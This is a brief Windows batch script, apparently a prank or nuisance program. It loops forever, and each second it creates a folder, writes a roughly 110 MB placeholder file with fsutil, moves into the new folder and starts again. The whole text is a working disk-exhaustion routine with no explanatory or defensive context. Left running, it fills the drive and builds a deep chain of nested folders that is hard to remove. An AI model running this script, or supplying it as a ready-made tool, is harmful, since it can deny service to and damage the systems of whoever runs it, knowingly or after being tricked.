@echo off
set x=1
:spam
md ok
fsutil file createnew ok.txt 110000000
timeout 1 >nul
cd ok
goto spam
